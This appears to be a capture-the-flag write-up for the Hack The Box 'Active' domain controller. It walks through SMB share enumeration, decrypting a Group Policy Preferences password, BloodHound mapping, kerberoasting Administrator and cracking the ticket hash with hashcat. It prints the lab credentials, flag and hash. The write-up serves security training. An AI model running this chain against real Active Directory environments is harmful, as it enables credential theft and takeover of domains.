# Writeup
## Recon
### nmapAutomator
```
sudo nmapAutomator.sh -H 10.10.10.100 -t Recon
```

```
# Nmap 7.91 scan initiated Tue Aug 10 11:04:47 2021 as: /usr/bin/nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,49152,49153,49154,49155,49157,49158 --open -oN nmap/Script_10.10.10.100.nmap --system-dns --stats-every 2s 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.056s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-10 15:22:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 17m34s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-10T15:23:24
|_  start_date: 2021-08-10T15:17:42

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 10 11:06:05 2021 -- 1 IP address (1 host up) scanned in 78.11 seconds
```

```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
currentTime: 20210810153101.0Z
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=active,DC=htb
namingContexts: DC=active,DC=htb
namingContexts: CN=Configuration,DC=active,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
namingContexts: DC=DomainDnsZones,DC=active,DC=htb
namingContexts: DC=ForestDnsZones,DC=active,DC=htb
defaultNamingContext: DC=active,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
configurationNamingContext: CN=Configuration,DC=active,DC=htb
rootDomainNamingContext: DC=active,DC=htb
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
highestCommittedUSN: 94245
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
dnsHostName: DC.active.htb
ldapServiceName: active.htb:dc$@ACTIVE.HTB
serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
 ion,DC=active,DC=htb
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
isSynchronized: TRUE
isGlobalCatalogReady: TRUE
domainFunctionality: 4
forestFunctionality: 4
domainControllerFunctionality: 4

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS		
```

### rustscan
```
sudo rustscan -a 10.10.10.100 | tee rustscan.txt 
```

```
Nmap scan report for 10.10.10.100
Host is up, received echo-reply ttl 127 (0.081s latency).
Scanned at 2021-08-10 11:22:03 EDT for 0s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49169/tcp open  unknown          syn-ack ttl 127
49171/tcp open  unknown          syn-ack ttl 127
49182/tcp open  unknown          syn-ack ttl 127
```

## Initial Access

### Exploring readable Replication share with smbmap
```
smbmap -R Replication -H 10.10.10.100 | tee smbmap.txt
```

```
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	active.htb
	.\Replication\active.htb\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	scripts
	.\Replication\active.htb\DfsrPrivate\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	ConflictAndDeleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Deleted
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Installing
	.\Replication\active.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	fr--r--r--              119 Sat Jul 21 06:38:11 2018	GPE.INI
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 06:38:11 2018	Registry.pol
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
	.\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Groups
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	fr--r--r--               22 Sat Jul 21 06:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
	.\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
```

- These files look interesting, so download the whole directory with smbclient

```
smbclient //10.10.10.100/Replication
> mask ""
> recurse
> prompt
> mget *
```

### Decrypting the Groups.xml password
- In particular, there is a pretty interesting file called Groups.xml in one of the directories

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

- We can see that the user is called SVC_TGS and the password is encrypted. Fortunately, gpp-decrypt can be used to decrypt the password for the user

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### Credentialed SMB enumeration using CrackMapExec

- Notice that more shares are readable with credentialed enumeration

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]                                                             
└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares                                                               
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)       
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18                                               
SMB         10.10.10.100    445    DC               [+] Enumerated shares                                                                           
SMB         10.10.10.100    445    DC               Share           Permissions     Remark                                                          
SMB         10.10.10.100    445    DC               -----           -----------     ------                                                          
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin                                                    
SMB         10.10.10.100    445    DC               C$                              Default share                                                   
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC                                                      
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share                                              
SMB         10.10.10.100    445    DC               Replication     READ                                                                            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share                                              
SMB         10.10.10.100    445    DC               Users           READ             
```

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]                                                                                                                                                      
└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --users                                                                                                                                                         
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                                                                
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18                                                                                                                                        
SMB         10.10.10.100    445    DC               [+] Enumerated domain user(s)                                                                                                                                                            
SMB         10.10.10.100    445    DC               active.htb\Administrator                  badpwdcount: 0 baddpwdtime: 2018-07-30 13:17:35.477311                                                                                         
SMB         10.10.10.100    445    DC               active.htb\Guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58                                                                                                
SMB         10.10.10.100    445    DC               active.htb\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58                                                                                                
SMB         10.10.10.100    445    DC               active.htb\SVC_TGS                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
```

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]                                                                                                                                                      
└─$ crackmapexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --groups                                                           2 ⨯                                                                                          
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                                                                
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18                                                                                                                                        
SMB         10.10.10.100    445    DC               [+] Enumerated domain group(s)                                                                                                                                                           
SMB         10.10.10.100    445    DC               Administrators                           membercount: 3                                                                                                                                  
SMB         10.10.10.100    445    DC               Users                                    membercount: 3                                                                                                                                  
SMB         10.10.10.100    445    DC               Guests                                   membercount: 2                                                                                                                                  
SMB         10.10.10.100    445    DC               Print Operators                          membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Backup Operators                         membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Replicator                               membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Remote Desktop Users                     membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Network Configuration Operators          membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Performance Monitor Users                membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Performance Log Users                    membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Distributed COM Users                    membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               IIS_IUSRS                                membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               Cryptographic Operators                  membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Event Log Readers                        membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Certificate Service DCOM Access          membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Domain Computers                         membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Domain Controllers                       membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Schema Admins                            membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               Enterprise Admins                        membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               Cert Publishers                          membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Domain Admins                            membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               Domain Users                             membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Domain Guests                            membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Group Policy Creator Owners              membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               RAS and IAS Servers                      membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Server Operators                         membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Account Operators                        membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Pre-Windows 2000 Compatible Access       membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               Incoming Forest Trust Builders           membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Windows Authorization Access Group       membercount: 1                                                                                                                                  
SMB         10.10.10.100    445    DC               Terminal Server License Servers          membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Allowed RODC Password Replication Group  membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Denied RODC Password Replication Group   membercount: 8                                                                                                                                  
SMB         10.10.10.100    445    DC               Read-only Domain Controllers             membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               Enterprise Read-only Domain Controllers  membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               DnsAdmins                                membercount: 0                                                                                                                                  
SMB         10.10.10.100    445    DC               DnsUpdateProxy                           membercount: 0 
```

### Finding user flag using credentialed smbmap and smbclient

```
┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100                                                                                                                                                                      1 ⨯
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY

```

- Download the user.txt flag to Kali with smbclient

```
┌──(kali㉿kali)-[~/HTB/machines/active]
└─$ smbclient //10.10.10.100/Users -U SVC_TGS                                                                                                                                                                                          130 ⨯
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                10459647 blocks of size 4096. 5728402 blocks available
smb: \> cd SVC_TGS/Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

                10459647 blocks of size 4096. 5728402 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 
```

- User flag done!

```
┌──(kali㉿kali)-[~/HTB/machines/active]
└─$ cat user.txt   
86d67d8ba232bb6a254aa4d10159e983
```


## Privesc

### Using Windows to connect to the domain with runas /netonly
- First, STOP the OpenVPN connection to HTB on Kali and set up the OpenVPN connection on a Windows virtual machine. 
- Download a release of BloodHound on Windows, then proceed (might have to disable antivirus)
- In CMD, the `runas /netonly` command allows you to essentially pretend you are on the domain of the domain controller on an instance of (in this case) Powershell -- provided you have valid credentials. And that we do!

```
C:\Windows\system32>runas /netonly /user:active.htb\SVC_TGS powershell
Enter the password for active.htb\SVC_TGS:
Attempting to start powershell as user "active.htb\SVC_TGS" ...
```

- Make sure that you can see the active.htb shares in Powershell to validate that it worked

```
PS C:\Windows\system32> dir \\10.10.10.100\Users


    Directory: \\10.10.10.100\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         7/16/2018   5:14 AM                Administrator
d-r---         7/13/2009  11:57 PM                Public
d-----         7/21/2018  10:16 AM                SVC_TGS
```

### Run SharpHound on the domain

- Here's where the magic happens. You can run SharpHound.exe on the Windows VM against the domain controller as if you were actually in the domain as the user SVC_TGS! No need for a shell.

```
PS C:\Users\hacker\Downloads\BloodHound-win32-x64\resources\app\Collectors> .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
-----------------------------------------------
Initializing SharpHound at 4:28 PM on 8/10/2021
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 18 MB RAM
Status: 46 objects finished (+46 23)/s -- Using 25 MB RAM
Enumeration finished in 00:00:02.7978617
Compressing data to .\20210810162852_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 4:28 PM on 8/10/2021! Happy Graphing!
```

### Analyzing BloodHound output

- Back on Kali, reconnect the VPN, copy the zip file over, start neo4j and BloodHound to analyze the zip file
- Notice that doing the "Shortest Paths from Kerberoastable Users" query returns Administrator as Kerberoastable

![79ead63dd2d7da06b703e6c4a54e76dd.png](../../_resources/79ead63dd2d7da06b703e6c4a54e76dd-1.png)

![fca370b98b18c3aa0d6695d615b681dc.png](../../_resources/fca370b98b18c3aa0d6695d615b681dc-1.png)

### Kerberoasting administrator with GetUserSPNs

- Initially encountered the KRB_AP_ERR_SKEW error, but there was an easy fix online using `ntpdate` to synchronize the time with the domain controller
```
┌──(kali㉿kali)-[~/HTB/machines/active]                                                                                                                                                                                                      
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -outputfile tgs.out                                                                                                                               
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation                                                                                                                                                                                     
                                                                                                                                                                                                                                             
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation                                                                            
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------                                                                            
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783                                                                                        
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)   
```

```
┌──(kali㉿kali)-[~/HTB/machines/active]
└─$ sudo ntpdate 10.10.10.100
10 Aug 18:30:02 ntpdate[7476]: step time server 10.10.10.100 offset +1055.343058 sec

┌──(kali㉿kali)-[~/HTB/machines/active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -outputfile tgs.out         
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             
```

- The `tgs.out` output file gives the hash for administrator

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5a6f16e5e3f1acb51844818c61c98dd6$94b37a45e159c53a11c20c98ea8d9e8a561197925217031d90f55b65ad6f0ed99c1ebdf303e75ff977a822d2b439ac96e396fab22d6086dfab129c77d799165894fc2e46b04d9371d21d8412e4751993dbd741012d15f5cb15e62d03ccca8b630c00eb43873407dce9fa898467e115648371afff8d8cb7fe648a5e61fd0662f81c88a5d2ba73d7790bd3c767a723857f752701fe7ae2e7ee7bcb300d1fb30ca28e599a2ae41f5e3470958bab665c3345063d52b24811a7a0f886a5a0c2ab3fd66549e88215a8a548595bc532e3de82bc6cd03b38f4771c373e1fa0d1fcaf2578c9007cc8fc489ffdb83c1e55c444020803f5577fe1cceb9904d1e5d88e95dcfbfee6f0171044b9cdf76e4381a414d705f7c0dc10ee81040236184ac0bf5894727ef6b301781442c2e4d649b6cf188b4f8105bcbcceb329f6300fef433ab56695cdcfc7c071f5f0c5bda9ee607e5b632f3280a89b6d2767a0320a7bee80bd4e5f601db7377b1c419c4bedbadb433e84d84f6b7e1c9366299b25e76312c62a6d0737bf089ab8f1c134a7eb685fc5da0ca29257b69b779c0e5a75c464dbe645963510e50a025172a1d43f523dd3b1afab23bec05a44ab1436c79ee9002be54e1333b83ae3cb6d0b355f8420076746bae4f2a0cf6b2bb5e153869b69f95c14d59c9a56454704e11be5f760c2293ba9639f09dc70966562aa35205c9ff7f02b27d2616bfb1564c26ccaeed83b8089d001e64c5189d9754ab59ed07ee9764d4a71efba96eed22430be002f02ab53fe2292a31bddf2d80347aac4c9ad791f7c6d96046a03ecd8b6b0dd3f30826112d4e9e7bc343e60066d2101f042f9e7bea57cc5c68a6d315b4b5163fb0af72576dbeb438dd7eec49b0711d77524b4ac0de05315a08049fc8e774535858869cda740ffd268bab155766822a515cc7a6fada2fc9adbdff35ee0d023b59f7a12afbe98b7e1e47db3a34e6e455b0b9b59d8eee65c1bb4832c4c47f3b027b4dd3caa74a26bf3feecc23e39d0e0cad0175ff896a040d482d6e4402779d1ad564128eb641f9a14c5d5207ff1f2783816938cad29af6a70fd500f348eb4ada10372b1f97ed4b7e1285a19c5479490e3e3c8c8360e4f574ff807bdb2e7653eddcc0c93263a1f19af88b58fd402787df2fc6439f0f29b648fac8aa1b76c4f72bb92fcce60e0e084744cbfc0b2d8aa7fc517d3d67107c95e00ad409e9e72fcb9f8e2906874162c909d3ecb4abe4ccbc81632970155
```

### Cracking the Kerberos hash with hashcat

- We can easily identify the hashtype to use in hashcat (`13100`) by looking in `hashcat --example-hashes` 

```
┌──(kali㉿kali)-[~/HTB/machines/active]                                                                                                                                                                                                      
└─$ hashcat -m 13100 -a 0 -o cracked.txt tgs.out /usr/share/wordlists/rockyou.txt                                                                                                                                                      130 ⨯ 
hashcat (v6.1.1) starting...                                                       
```

```
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...970155
Time.Started.....: Tue Aug 10 19:30:06 2021 (9 secs)
Time.Estimated...: Tue Aug 10 19:30:15 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1259.3 kH/s (6.74ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10551296/14344385 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> TUGGIE

Started: Tue Aug 10 19:30:05 2021
Stopped: Tue Aug 10 19:30:15 2021

```

